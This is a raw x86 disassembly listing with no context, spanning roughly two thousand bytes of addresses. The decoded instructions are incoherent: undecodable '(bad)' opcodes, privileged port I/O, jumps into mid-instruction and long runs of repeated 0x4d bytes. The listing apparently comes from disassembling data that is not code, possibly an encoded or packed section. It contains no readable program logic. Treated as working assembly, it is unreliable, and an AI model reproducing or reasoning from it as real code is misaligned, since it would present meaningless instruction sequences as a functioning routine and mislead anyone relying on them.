  426613:	dec    ebp
  426614:	dec    ebp
  426615:	dec    ebp
  426616:	mov    ecx,0x5c09a180
  42661b:	sbb    DWORD PTR [ecx],ecx
  42661d:	pop    esp
  42661e:	jo     0x426673
  426620:	adc    DWORD PTR [edx-0x72c7163e],esp
  426626:	lea    esi,[esi+0x9bab207]
  42662c:	(bad)  
  42662d:	(bad)  
  42662e:	adc    BYTE PTR [ecx+0x2f],al
  426631:	prefetchw BYTE PTR [ebp+0x4d]
  426635:	xor    al,0xf9
  426638:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  42663f:	mov    dl,0x7
  426641:	or     al,0x80
  426643:	xchg   edi,eax
  426644:	stc    
  426645:	adc    bh,0x86
  426648:	push   ebx
  426649:	sub    dl,BYTE PTR [ebx+0xb]
  42664c:	call   DWORD PTR [ecx-0x4e]
  42664f:	clc    
  426650:	sub    esp,ebp
  426652:	mov    dl,0xed
  426654:	mov    ebp,edi
  426656:	xlat   BYTE PTR ds:[ebx]
  426657:	pop    esp
  426658:	add    DWORD PTR [edi-0x7],ecx
  42665b:	or     eax,0x77504d4d
  426660:	mov    eax,DWORD PTR [eax+0x49608b77]
  426666:	cmp    eax,0xef50d146
  42666b:	icebp  
  42666c:	outs   dx,BYTE PTR ds:[esi]
  42666d:	sub    ecx,DWORD PTR [ebx]
  42666f:	sub    BYTE PTR [eax+0xa],dl
  426672:	out    dx,al
  426673:	or     BYTE PTR [edi-0x7],0xd
  426677:	dec    ebp
  426678:	dec    ebp
  426679:	sbb    BYTE PTR [eax-0x7a],0xd
  42667d:	dec    ebp
  42667e:	dec    ebp
  42667f:	push   eax
  426680:	xlat   BYTE PTR ds:[ebx]
  426681:	xchg   dl,bh
  426683:	and    ah,BYTE PTR [edi+ebp*2]
  426686:	cmp    BYTE PTR [ebx-0x4e],ah
  426689:	or     DWORD PTR [edi-0x2a],ecx
  42668c:	cmp    cl,BYTE PTR [ebp-0x7968a073]
  426692:	or     DWORD PTR [edi+0x6e],ecx
  426695:	cmp    cl,BYTE PTR [ebp+0x38305e8d]
  42669b:	lea    ecx,[ebp-0x74b0af47]
  4266a1:	or     eax,0x74804d4d
  4266a6:	mov    ecx,0xd854f50
  4266ab:	dec    ebp
  4266ac:	dec    ebp
  4266ad:	pop    esi
  4266ae:	daa    
  4266af:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  4266b5:	mov    cl,BYTE PTR ds:0x2c5e4d4d
  4266bb:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  4266c1:	or     eax,0x5e4d4d0d
  4266c6:	pop    ds
  4266c7:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  4266cd:	lea    ecx,[ebp+0x4d]
  4266d0:	dec    ebp
  4266d1:	in     eax,dx
  4266d2:	push   0xffffffe8
  4266d4:	cmp    ch,0xb9
  4266d7:	push   eax
  4266d8:	add    DWORD PTR [ecx*2+0x77804d4d],ecx
  4266df:	jno    0x426741
  4266e1:	jae    0x42671b
  4266e3:	lea    ecx,[ebp-0x11feaf47]
  4266e9:	dec    ebp
  4266ea:	dec    ebp
  4266eb:	dec    ebp
  4266ec:	in     eax,dx
  4266ed:	mov    dl,0xaa
  4266ef:	mov    ecx,0x4d6f0150
  4266f4:	dec    ebp
  4266f5:	dec    ebp
  4266f6:	pusha  
  4266f7:	push   edi
  4266f8:	cmp    BYTE PTR [ebp+0x150b98d],cl
  4266fe:	out    dx,eax
  4266ff:	dec    ebp
  426700:	dec    ebp
  426701:	dec    ebp
  426702:	in     eax,dx
  426703:	mov    dl,0x9d
  426705:	mov    ecx,0x4da60150
  42670a:	dec    ebp
  42670b:	dec    ebp
  42670c:	adc    BYTE PTR [ecx],0xb9
  42670f:	push   eax
  426710:	add    DWORD PTR [ecx],esp
  426712:	dec    ebp
  426713:	dec    ebp
  426714:	dec    ebp
  426715:	pusha  
  426716:	in     eax,dx
  426717:	cmp    BYTE PTR [ebp+0x150b98d],cl
  42671d:	mov    eax,ds:0x534d4d4d
  426722:	cld    
  426723:	pusha  
  426724:	xor    ch,BYTE PTR [esi-0x73]
  426727:	lea    edi,[ecx+0x4d710150]
  42672d:	dec    ebp
  42672e:	dec    ebp
  42672f:	mov    dl,0x86
  426731:	or     al,0x60
  426733:	sbb    ebx,DWORD PTR [eax]
  426735:	lea    ecx,[ebp-0x6ffeaf47]
  42673b:	dec    ebp
  42673c:	dec    ebp
  42673d:	dec    ebp
  42673e:	pusha  
  42673f:	fwait
  426740:	xchg   BYTE PTR [ebp+0x150b98d],cl
  426746:	adc    eax,0x804d4d4d
  42674b:	lock jno 0x42673b
  42674e:	add    eax,0x29bab20d
  426753:	push   DWORD PTR [edx+0xd164f50]
  426759:	dec    ebp
  42675a:	dec    ebp
  42675b:	xor    BYTE PTR [edi+0x21],0x80
  42675f:	lock and DWORD PTR [ebx-0x4],edx
  426763:	mov    dl,0x86
  426765:	or     al,0xed
  426767:	add    eax,0x29bab20d
  42676c:	push   DWORD PTR [edx+0x1e4f0f7c]
  426772:	or     eax,0x4d4d4d4d
  426777:	lea    ecx,[ebp+0xd164f01]
  42677d:	dec    ebp
  42677e:	dec    ebp
  42677f:	or     al,BYTE PTR [eax-0xf7f8e89]
  426785:	jno    0x4267da
  426787:	cld    
  426788:	mov    dl,0x86
  42678a:	or     al,0xed
  42678c:	add    eax,0x29bab20d
  426791:	push   DWORD PTR [edx-0x74b0fef6]
  426797:	or     eax,0x800a4d4d
  42679c:	ja     0x426766
  42679e:	or     ch,0x3e
  4267a1:	cmp    cl,BYTE PTR [ebp+0x194f7c8d]
  4267a7:	dec    ebp
  4267a8:	dec    ebp
  4267a9:	dec    ebp
  4267aa:	sar    ch,cl
  4267ac:	sbb    al,0x38
  4267ae:	dec    ebp
  4267af:	add    DWORD PTR [eax-0x8b2ea89],0x808b7750
  4267b9:	ja     0x426746
  4267bb:	dec    edi
  4267bc:	push   0xffffffd5
  4267be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267bf:	mov    ds:0x1d4c6957,al
  4267c4:	in     eax,dx
  4267c5:	fstp   st(0)
  4267c7:	mov    esp,0x21f08076
  4267cc:	adc    BYTE PTR [edi+0x530de221],0x51
  4267d3:	popf   
  4267d4:	push   ebx
  4267d5:	div    DWORD PTR [edx-0x414dd608]
  4267db:	or     al,0xff
  4267dd:	inc    BYTE PTR [eax-0x2e7f3769]
  4267e3:	cmp    cl,BYTE PTR es:[ebp+0x9a65f8d]
  4267ea:	dec    edi
  4267eb:	push   0x808d8d2f
  4267f0:	lock and DWORD PTR [eax+0x51532197],eax
  4267f7:	mov    dl,0xbe
  4267f9:	or     al,0x53
  4267fb:	div    DWORD PTR [edx-0x100d608]
  426801:	adc    BYTE PTR [edi-0x1a2e7f38],0x3a
  426808:	lea    ecx,[ebp-0xf7f59b0]
  42680e:	and    DWORD PTR [eax+0x51532197],eax
  426814:	mov    dl,0xbe
  426816:	or     al,0x53
  426818:	div    DWORD PTR [edx-0x100d608]
  42681e:	adc    BYTE PTR [edi-0x322e7f38],0x3a
  426825:	lea    ecx,[ebp+0x6760a650]
  42682b:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426831:	and    eax,0x804d4d4d
  426836:	adc    DWORD PTR [ecx+0x4d290150],edi
  42683c:	dec    ebp
  42683d:	dec    ebp
  42683e:	pusha  
  42683f:	daa    
  426840:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426846:	sub    eax,0x604d4d4d
  42684b:	sub    BYTE PTR [eax],bh
  42684d:	lea    ecx,[ebp-0x3ffeaf47]
  426853:	dec    ebp
  426854:	dec    ebp
  426855:	dec    ebp
  426856:	in     eax,dx
  426857:	mov    dl,0x4
  426859:	mov    ecx,0x4d350150
  42685e:	dec    ebp
  42685f:	dec    ebp
  426860:	pusha  
  426861:	adc    al,0x38
  426863:	lea    ecx,[ebp+0x390150b9]
  426869:	dec    ebp
  42686a:	dec    ebp
  42686b:	dec    ebp
  42686c:	in     eax,dx
  42686d:	mov    dl,0xf3
  42686f:	mov    ecx,0x4d3d0150
  426874:	dec    ebp
  426875:	dec    ebp
  426876:	pusha  
  426877:	sbb    al,0x38
  426879:	lea    ecx,[ebp-0x2dfeaf47]
  42687f:	dec    ebp
  426880:	dec    ebp
  426881:	dec    ebp
  426882:	adc    BYTE PTR [ecx],0xb9
  426885:	push   eax
  426886:	add    DWORD PTR [ebp+0x4d],eax
  426889:	dec    ebp
  42688a:	dec    ebp
  42688b:	pusha  
  42688c:	sbb    BYTE PTR [eax],bh
  42688e:	lea    ecx,[ebp+0x490150b9]
  426894:	dec    ebp
  426895:	dec    ebp
  426896:	dec    ebp
  426897:	pusha  
  426898:	daa    
  426899:	pop    ebp
  42689a:	lea    ecx,[ebp-0x7efeaf47]
  4268a0:	dec    ebp
  4268a1:	dec    ebp
  4268a2:	dec    ebp
  4268a3:	pusha  
  4268a4:	push   ebx
  4268a5:	xor    ecx,DWORD PTR [ebp+0x150b98d]
  4268ab:	aam    0x4d
  4268ad:	dec    ebp
  4268ae:	dec    ebp
  4268af:	cld    
  4268b0:	ja     0x426835
  4268b2:	mov    ds:0x8d185d60,eax
  4268b7:	lea    edi,[ecx+0x4d550150]
  4268bd:	dec    ebp
  4268be:	dec    ebp
  4268bf:	in     eax,dx
  4268c0:	mov    dl,0x5d
  4268c2:	mov    ecx,0x4d590150
  4268c7:	dec    ebp
  4268c8:	dec    ebp
  4268c9:	cld    
  4268ca:	ja     0x426874
  4268cc:	or     bh,ah
  4268ce:	ja     0x4268d4
  4268d0:	xchg   ebp,eax
  4268d1:	cld    
  4268d2:	ja     0x426880
  4268d4:	stos   DWORD PTR es:[edi],eax
  4268d5:	pusha  
  4268d6:	(bad)  
  4268d8:	lea    ecx,[ebp+0x5d0150b9]
  4268de:	dec    ebp
  4268df:	dec    ebp
  4268e0:	dec    ebp
  4268e1:	cld    
  4268e2:	ja     0x426868
  4268e4:	jg     0x426946
  4268e6:	fistp  DWORD PTR [eax-0x73]
  4268e9:	lea    edi,[ecx+0x4dd60150]
  4268ef:	dec    ebp
  4268f0:	dec    ebp
  4268f1:	cld    
  4268f2:	ja     0x4268ae
  4268f4:	popf   
  4268f5:	cld    
  4268f6:	ja     0x4268f0
  4268f8:	xchg   esi,eax
  4268f9:	pusha  
  4268fa:	inc    edx
  4268fb:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426901:	gs dec ebp
  426903:	dec    ebp
  426904:	dec    ebp
  426905:	cld    
  426906:	ja     0x4268bc
  426908:	xchg   BYTE PTR [eax-0x687f8e10],al
  42690e:	jno    0x426963
  426910:	push   ecx
  426911:	push   ebx
  426912:	div    DWORD PTR [edx-0x74df342]
  426918:	sub    edi,edi
  42691a:	inc    ah
  42691c:	fwait
  42691d:	adc    BYTE PTR [edi+0x71e78071],0x53
  426924:	jle    0x4268d8
  426926:	pop    es
  426927:	or     al,0x53
  426929:	mov    esi,DWORD PTR [edx-0x6300d644]
  42692f:	inc    ebx
  426930:	dec    BYTE PTR [ecx]
  426932:	loopne 0x426965
  426934:	iret   
  426935:	add    DWORD PTR [eax-0x187f8e69],0x71
  42693c:	push   ebx
  42693d:	jle    0x4268f1
  42693f:	pop    es
  426940:	or     al,0x53
  426942:	mov    esi,DWORD PTR [edx-0x6300d644]
  426948:	and    bh,0x8b
  42694b:	mov    ds:0x8d8dcd05,al
  426950:	lea    esp,[edx-0x7272e14e]
  426956:	lea    eax,[ebx-0x7b]
  426959:	adc    BYTE PTR [ecx],dh
  42695b:	add    DWORD PTR [bx+si+0x7197],0xffffff80
  426961:	lock jno 0x4269b7
  426964:	jle    0x4269b9
  426966:	std    
  426967:	mov    dl,0xba
  426969:	sub    DWORD PTR [edx-0x4900f3f9],esi
  42696f:	xor    al,0x8b
  426972:	in     al,dx
  426973:	inc    BYTE PTR [eax-0x187f8e69]
  426979:	jno    0x4269ce
  42697b:	jle    0x4269d0
  42697d:	mov    esi,DWORD PTR [edx-0x434df3f9]
  426983:	sub    edi,edi
  426985:	pushf  
  426986:	in     eax,dx
  426987:	sti    
  426988:	out    dx,eax
  426989:	push   eax
  42698a:	lock mov esp,DWORD PTR [ebx-0x2]
  42698e:	in     al,0x1
  426990:	xor    al,0x71
  426993:	adc    BYTE PTR [edi+0x53515371],0xf7
  42699a:	mov    dl,0xbe
  42699c:	or     al,0xb2
  42699e:	clc    
  42699f:	sub    edi,edi
  4269a1:	(bad)  
  4269a2:	push   eax
  4269a3:	add    DWORD PTR [esi],edx
  4269a5:	or     eax,0xf0804d4d
  4269aa:	and    DWORD PTR [eax+0x51532197],eax
  4269b0:	push   ebx
  4269b1:	div    DWORD PTR [edx-0x414dd608]
  4269b7:	or     al,0xff
  4269b9:	inc    BYTE PTR [ecx]
  4269bb:	xchg   edi,eax
  4269bc:	adc    DWORD PTR [eax+0x16],0x1
  4269c0:	push   ds
  4269c1:	or     eax,0xb3f14d4d
  4269c6:	cmp    BYTE PTR [ebp-0x46017f73],cl
  4269cc:	push   eax
  4269cd:	lock es in eax,dx
  4269d0:	mov    dl,0xfb
  4269d2:	or     bl,0xb9
  4269d5:	push   eax
  4269d6:	out    0xf2,eax
  4269d8:	add    esi,esp
  4269da:	add    al,0xb9
  4269dc:	push   eax
  4269dd:	out    0x2e,eax
  4269df:	in     eax,dx
  4269e0:	jl     0x4269d0
  4269e2:	mov    ecx,0x1f3e750
  4269e7:	out    0x15,al
  4269e9:	mov    ecx,0xed36e750
  4269ee:	jl     0x4269f3
  4269f0:	mov    ecx,0x80f4e750
  4269f5:	retf   
  4269f6:	mov    ecx,0x803ee750
  4269fb:	test   DWORD PTR [ecx-0x7f0a18b0],edi
  426a01:	push   es
  426a02:	mov    ecx,0x8046e750
  426a07:	test   DWORD PTR [ecx-0x7f9d18b0],edi
  426a0d:	retf   
  426a0e:	mov    ecx,0x1dee750
  426a13:	out    0xf2,al
  426a15:	mov    ecx,0xed56e750
  426a1a:	jl     0x426a0a
  426a1c:	mov    ecx,0x1e0e750
  426a21:	out    0x7a,al
  426a23:	mov    ecx,0xed5ee750
  426a28:	jl     0x426a2d
  426a2a:	mov    ecx,0xb9f1e750
  426a2f:	push   eax
  426a30:	lock mov cx,0x9750
  426a35:	cli    
  426a36:	adc    BYTE PTR [ecx],0xb9
  426a39:	push   eax
  426a3a:	lock push 0xffffff80
  426a3d:	lock and DWORD PTR [eax-0x8acde69],eax
  426a44:	push   ebx
  426a45:	push   ecx
  426a46:	mov    dl,0xf8
  426a48:	sub    DWORD PTR [edx-0x100f342],esi
  426a4e:	adc    BYTE PTR [edi+0x21e78021],0x53
  426a55:	jle    0x426a09
  426a57:	pop    es
  426a58:	or     al,0x1
  426a5a:	xor    eax,esi
  426a5c:	bound  edx,QWORD PTR [ebx-0x75]
  426a5f:	mov    dl,0xbc
  426a61:	sub    edi,edi
  426a63:	pushf  
  426a64:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426a68:	pushf  
  426a69:	mov    ecx,0xf0800e50
  426a6e:	and    DWORD PTR [eax+0x51532197],eax
  426a74:	push   ebx
  426a75:	div    DWORD PTR [edx-0x74df342]
  426a7b:	sub    edi,edi
  426a7d:	inc    BYTE PTR [eax+0x31012197]
  426a83:	lock es push ebx
  426a86:	jle    0x426a08
  426a88:	out    0x21,eax
  426a8a:	mov    dl,0x7
  426a8c:	or     al,0x53
  426a8e:	mov    esi,DWORD PTR [edx-0x6300d644]
  426a94:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426a98:	pushf  
  426a99:	mov    ecx,0xf0800e50
  426a9e:	and    DWORD PTR [eax-0x8acde69],eax
  426aa4:	mov    dl,0xf8
  426aa6:	sub    DWORD PTR [ebx+0x51],edx
  426aa9:	mov    dl,0xbe
  426aab:	or     al,0xff
  426aad:	inc    BYTE PTR [eax-0x187fde69]
  426ab3:	and    DWORD PTR [ebx+0x7e],edx
  426ab6:	mov    dl,0x7
  426ab8:	or     al,0x53
  426aba:	mov    esi,DWORD PTR [edx-0x6300d644]
  426ac0:	mov    ecx,0x52974150
  426ac5:	or     eax,0xf0804d4d
  426aca:	and    DWORD PTR [eax-0x8acde69],eax
  426ad0:	mov    dl,0xf8
  426ad2:	sub    DWORD PTR [ebx+0x51],edx
  426ad5:	mov    dl,0xbe
  426ad7:	or     al,0xff
  426ad9:	inc    BYTE PTR [eax-0x187fde69]
  426adf:	and    DWORD PTR [ebx+0x7e],edx
  426ae2:	mov    dl,0x7
  426ae4:	or     al,0x53
  426ae6:	mov    esi,DWORD PTR [edx-0x6300d644]
  426aec:	mov    ecx,0xa5974150
  426af1:	or     eax,0xf0804d4d
  426af6:	jno    0x426a78
  426af8:	xchg   edi,eax
  426af9:	jno    0x426b4e
  426afb:	not    DWORD PTR [ebx+0x51]
  426afe:	mov    dl,0xf8
  426b00:	sub    DWORD PTR [edx-0x100f342],esi
  426b06:	adc    BYTE PTR [edi+0x71e78071],0x53
  426b0d:	jle    0x426b62
  426b0f:	mov    esi,DWORD PTR [edx-0x434df3f9]
  426b15:	sub    edi,edi
  426b17:	pushf  
  426b18:	in     al,dx
  426b19:	(bad)  
  426b1a:	push   eax
  426b1b:	add    DWORD PTR [esi],edx
  426b1d:	or     eax,0xf0804d4d
  426b22:	and    DWORD PTR [eax-0x187fde69],eax
  426b28:	out    dx,eax
  426b29:	push   ebx
  426b2a:	not    DWORD PTR [ebx+0x51]
  426b2d:	mov    dl,0xbe
  426b2f:	or     al,0xb2
  426b31:	clc    
  426b32:	sub    edi,edi
  426b34:	inc    BYTE PTR [ecx]
  426b36:	dec    edi
  426b37:	push   edx
  426b38:	or     eax,0xf504d4d
  426b3d:	add    DWORD PTR [esi],ebx
  426b3f:	or     eax,0x77014d4d
  426b44:	bound  eax,QWORD PTR [esi+0x4d4d61d3]
  426b4a:	xor    al,0x71
  426b4d:	adc    BYTE PTR [edi+0x530de271],0x51
  426b54:	stos   DWORD PTR es:[edi],eax
  426b55:	push   ebx
  426b56:	pushf  
  426b57:	mov    dl,0xbe
  426b59:	or     al,0xb2
  426b5b:	clc    
  426b5c:	sub    edi,edi
  426b5e:	(bad)  
  426b5f:	push   eax
  426b60:	lidtd  [esi]
  426b63:	or     eax,0x77804d4d
  426b68:	and    DWORD PTR [eax-0x3acde10],eax
  426b6e:	mov    dl,0x86
  426b70:	or     al,0x53
  426b72:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426b78:	aad    0x3d
  426b7a:	add    DWORD PTR [edi+0x16],ecx
  426b7d:	or     eax,0x800a4d4d
  426b82:	ja     0x426bf5
  426b84:	xor    al,0x71
  426b87:	push   ebx
  426b88:	cld    
  426b89:	mov    dl,0x86
  426b8b:	or     al,0x53
  426b8d:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426b93:	or     al,BYTE PTR [ecx]
  426b95:	dec    edi
  426b96:	and    eax,0xa4d4d4d
  426b9b:	xor    BYTE PTR [edi+0x15],0xe2
  426b9f:	lea    ecx,[ebp-0x9]
  426ba2:	xor    BYTE PTR [edi+0x21],0x80
  426ba6:	lock and DWORD PTR [ebx-0x4],edx
  426baa:	push   ebx
  426bab:	sub    al,BYTE PTR [eax-0x794d1019]
  426bb1:	or     al,0xb2
  426bb3:	mov    edx,0x1b2ff29
  426bb8:	add    DWORD PTR [ebp+0x504d4d0d],esp
  426bbe:	inc    ecx
  426bbf:	dec    edi
  426bc0:	push   ds
  426bc1:	or     eax,0x77014d4d
  426bc6:	xchg   BYTE PTR es:0x804d4d88,al
  426bcd:	lock jno 0x426b50
  426bd0:	xchg   edi,eax
  426bd1:	jno    0x426c26
  426bd3:	push   ecx
  426bd4:	mov    dl,0xbe
  426bd6:	or     al,0xed
  426bd8:	ret    0xb20d
  426bdb:	clc    
  426bdc:	sub    edi,edi
  426bde:	(bad)  
  426bdf:	push   eax
  426be0:	lidtd  [esi]
  426be3:	or     eax,0x33f14d4d
  426be8:	cmp    BYTE PTR [ebp+0x386b5e8d],cl
  426bee:	lea    ecx,[ebp+0xa4f50b9]
  426bf4:	dec    ebp
  426bf5:	dec    ebp
  426bf6:	dec    ebp
  426bf7:	add    edx,ebx
  426bf9:	jno    0x426bb4
  426bfb:	push   eax
  426bfc:	add    DWORD PTR [ebp+0x5e4d4d4d],esi
  426c02:	popa   
  426c03:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426c09:	stos   BYTE PTR es:[edi],al
  426c0a:	dec    ebp
  426c0b:	dec    ebp
  426c0c:	dec    ebp
  426c0d:	cmp    bl,0xb9
  426c10:	push   eax
  426c11:	dec    edi
  426c12:	xchg   ebp,eax
  426c13:	dec    ebp
  426c14:	dec    ebp
  426c15:	dec    ebp
  426c16:	xor    BYTE PTR [edx-0x66b0af47],0x4d
  426c1d:	dec    ebp
  426c1e:	dec    ebp
  426c1f:	in     eax,dx
  426c20:	push   0x29
  426c22:	cmp    ch,0xb9
  426c25:	push   eax
  426c26:	add    DWORD PTR [ecx+0x14d4d4d],edi
  426c2c:	fisubr DWORD PTR [ecx]
  426c2e:	mov    ecx,0x4dbd0150
  426c33:	dec    ebp
  426c34:	dec    ebp
  426c35:	in     eax,dx
  426c36:	mov    dl,0xd6
  426c38:	mov    ecx,0x4de20150
  426c3d:	dec    ebp
  426c3e:	dec    ebp
  426c3f:	add    edx,ebx
  426c41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c42:	mov    ecx,0x4dc50150
  426c47:	dec    ebp
  426c48:	dec    ebp
  426c49:	or     BYTE PTR [ebx-0x6297af47],0x4d
  426c50:	dec    ebp
  426c51:	dec    ebp
  426c52:	add    esi,esp
  426c54:	scas   al,BYTE PTR es:[edi]
  426c55:	pusha  
  426c56:	dec    ebp
  426c57:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426c5d:	ror    DWORD PTR [ebp+0x4d],0x4d
  426c61:	add    edx,ebx
  426c63:	or     eax,0x520150b9
  426c68:	dec    ebp
  426c69:	dec    ebp
  426c6a:	dec    ebp
  426c6b:	mov    ecx,0x4dae6850
  426c70:	dec    ebp
  426c71:	dec    ebp
  426c72:	in     eax,dx
  426c73:	jl     0x426c00
  426c75:	mov    ecx,0x4da56850
  426c7a:	dec    ebp
  426c7b:	dec    ebp
  426c7c:	or     BYTE PTR [ebx-0x72c783a0],0x8d
  426c83:	mov    ecx,0x4de40150
  426c88:	dec    ebp
  426c89:	dec    ebp
  426c8a:	cmp    ch,0xb9
  426c8d:	push   eax
  426c8e:	add    ebp,edx
  426c90:	dec    ebp
  426c91:	dec    ebp
  426c92:	dec    ebp
  426c93:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  426c98:	out    0x4d,al
  426c9a:	dec    ebp
  426c9b:	dec    ebp
  426c9c:	push   ebx
  426c9d:	push   0xffffffb9
  426c9f:	push   eax
  426ca0:	push   0x4d4d4da9
  426ca5:	add    DWORD PTR [eax-0x1b],ebp
  426ca8:	dec    ebp
  426ca9:	dec    ebp
  426caa:	dec    ebp
  426cab:	jl     0x426cfc
  426cad:	lods   eax,DWORD PTR ds:[esi]
  426cae:	dec    ebp
  426caf:	dec    ebp
  426cb0:	dec    ebp
  426cb1:	out    0x38,eax
  426cb3:	xor    edi,DWORD PTR [eax]
  426cb5:	jl     0x426d06
  426cb7:	(bad)  [ebp+0x4d]
  426cba:	dec    ebp
  426cbb:	ret    
  426cbc:	cmp    BYTE PTR [esi-0x7fbb46c8],dl
  426cc2:	ja     0x426d35
  426cc4:	xor    al,0x71
  426cc7:	adc    BYTE PTR [edi+0xd05ed71],0xb2
  426cce:	mov    edx,0xb2fc5329
  426cd3:	xchg   BYTE PTR [edi+edi*8],cl
  426cd6:	mov    dl,0x80
  426cd8:	lock jno 0x426cc8
  426cdb:	add    eax,0xb27e530d
  426ce0:	mov    edx,0xc07b229
  426ce5:	push   DWORD PTR [esi-0x4128fad]
  426ceb:	sbb    edx,DWORD PTR [ebx]
  426ced:	jo     0x426d42
  426cef:	dec    ebp
  426cf0:	arpl   bx,cx
  426cf2:	or     esi,ecx
  426cf4:	and    cl,BYTE PTR [ebp-0x101b7273]
  426cfa:	arpl   bx,di
  426cfc:	or     ebp,ebp
  426cfe:	cmp    BYTE PTR [ebp-0xf7f7273],cl
  426d04:	jno    0x426c86
  426d06:	xchg   edi,eax
  426d07:	jno    0x426d5c
  426d09:	push   ecx
  426d0a:	mov    dl,0xbe
  426d0c:	or     al,0xed
  426d0e:	ret    0xb20d
  426d11:	clc    
  426d12:	sub    edi,edi
  426d14:	(bad)  
  426d15:	in     al,dx
  426d16:	std    
  426d17:	adc    BYTE PTR [ecx+edi*4+0xaf01653],0x4d
  426d1f:	dec    ebp
  426d20:	dec    ebp
  426d21:	xor    al,0x71
  426d24:	and    bh,0x71
  426d27:	push   ebx
  426d28:	push   ecx
  426d29:	mov    dl,0xbe
  426d2b:	or     al,0xed
  426d2d:	dec    ebx
  426d2e:	or     eax,0xff29bcb2
  426d33:	sub    ch,ah
  426d35:	std    
  426d36:	mov    ecx,0xaf04180
  426d3b:	dec    ebp
  426d3c:	dec    ebp
  426d3d:	dec    ebp
  426d3e:	mov    ecx,0xb2b9b64b
  426d43:	mov    edx,0x7b6b909
  426d48:	mov    ecx,0xf080b6ff
  426d4d:	jno    0x426ccf
  426d4f:	out    0x71,eax
  426d51:	push   ebx
  426d52:	push   ecx
  426d53:	mov    dl,0xbe
  426d55:	or     al,0xed
  426d57:	dec    ebx
  426d58:	or     eax,0xff29bcb2
  426d5d:	sub    ch,ah
  426d5f:	std    
  426d60:	mov    ecx,0xaf01650
  426d65:	dec    ebp
  426d66:	dec    ebp
  426d67:	dec    ebp
  426d68:	xor    al,0x71
  426d6b:	adc    BYTE PTR [edi-0x12aeac8f],0xc2
  426d72:	or     eax,0xb20cbeb2
  426d77:	clc    
  426d78:	sub    edi,edi
  426d7a:	inc    BYTE PTR [eax-0x4d138e69]
  426d80:	xor    al,0x71
  426d83:	in     eax,dx
  426d84:	add    eax,0xb27e530d
  426d89:	mov    edx,0xc07b229
  426d8e:	push   DWORD PTR [esi-0x4128fad]
  426d94:	sbb    edx,DWORD PTR [ebx]
  426d96:	jo     0x426deb
  426d98:	dec    ebp
  426d99:	arpl   bx,cx
  426d9b:	or     edx,ebp
  426d9d:	call   0x934c:0x94d4d4d
  426da4:	dec    ebp
  426da5:	dec    ebp
  426da6:	dec    ebp
  426da7:	ins    BYTE PTR es:[edi],dx
  426da8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426da9:	mov    DWORD PTR [esp+edx*8],0x50767701
  426db0:	ja     0x426da1
  426db2:	xor    BYTE PTR [edi-0x11],0x64
  426db6:	mov    ecx,0x5011df58
  426dbb:	sbb    eax,0x86ee6d7c
  426dc0:	pop    DWORD PTR [ebx+0x26]
  426dc3:	xor    BYTE PTR [edi+0x76],0x80
  426dc7:	lock std 
  426dc9:	or     DWORD PTR [esi-0x3],eax
  426dcc:	or     al,0xb2
  426dce:	mov    esi,0x76f0800c
  426dd3:	adc    BYTE PTR [edi+0x537c53fd],0x72
  426dda:	push   edi
  426ddc:	xor    BYTE PTR [edi-0x38],0xaa
  426de0:	das    
  426de1:	cmp    cl,BYTE PTR es:[ebp+0x4f010a8d]
  426de8:	enter  0x4d0d,0x4d
  426dec:	or     dh,BYTE PTR [edx+0x778629ba]
  426df2:	mov    edx,0x77804d4d
  426df7:	xchg   DWORD PTR [eax+0x460932f0],eax
  426dfd:	std    
  426dfe:	or     al,0xb2
  426e00:	mov    esi,0x87f0800c
  426e05:	adc    BYTE PTR [edi+0x29bab232],0x80
  426e0c:	add    eax,ecx
  426e0e:	or     eax,0x30804d4d
  426e13:	push   ebx
  426e14:	jl     0x426e69
  426e16:	jb     0x426e17
  426e18:	sti    
  426e19:	arpl   bp,di
  426e1b:	or     DWORD PTR [edi+0x56],ecx
  426e1e:	lea    ecx,[ebp-0x37287f73]
  426e24:	jl     0x426e9d
  426e26:	scas   eax,DWORD PTR es:[edi]
  426e27:	fst    DWORD PTR [edi-0x21]
  426e2a:	adc    DWORD PTR [esi-0x7a],ebx
  426e2d:	pop    DWORD PTR [ebx+0x26]
  426e30:	push   eax
  426e31:	ja     0x426e2a
  426e33:	push   eax
  426e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e35:	jp     0x426e87
  426e37:	ja     0x426dbb
  426e39:	xor    BYTE PTR [edi+0x7a],0x80
  426e3d:	lock or BYTE PTR [ecx],0x46
  426e41:	std    
  426e42:	or     al,0xb2
  426e44:	mov    esi,0x7af0800c
  426e49:	adc    BYTE PTR [edi+0x537c5382],0x72
  426e50:	push   edi
  426e52:	stos   BYTE PTR es:[edi],al
  426e53:	dec    ebp
  426e54:	xlat   BYTE PTR ds:[ebx]
  426e55:	xor    eax,0x4d29bab2
  426e5a:	loopne 0x426e92
  426e5c:	cmp    cl,BYTE PTR [ebp-0x7b817973]
  426e62:	dec    ebp
  426e63:	dec    ebp
  426e64:	xor    BYTE PTR [edi+0x7a],0x80
  426e68:	lock or BYTE PTR [ecx],0x46
  426e6c:	std    
  426e6d:	or     al,0xb2
  426e6f:	mov    esi,0x7af0800c
  426e74:	adc    BYTE PTR [edi+0x537c5382],0x72
  426e7b:	push   edi
  426e7d:	stos   BYTE PTR es:[edi],al
  426e7e:	dec    ebp
  426e7f:	loopne 0x426eb7
  426e81:	cmp    cl,BYTE PTR [ebp+0x29bab28d]
  426e87:	dec    ebp
  426e88:	loopne 0x426eb8
  426e8a:	cmp    cl,BYTE PTR [ebp-0x7bc17973]
  426e90:	dec    ebp
  426e91:	dec    ebp
  426e92:	or     BYTE PTR [esi+esi*1+0x3a],0x8d
  426e97:	lea    eax,[eax+0x657f80ef]
  426e9d:	in     al,dx
  426e9e:	out    dx,eax
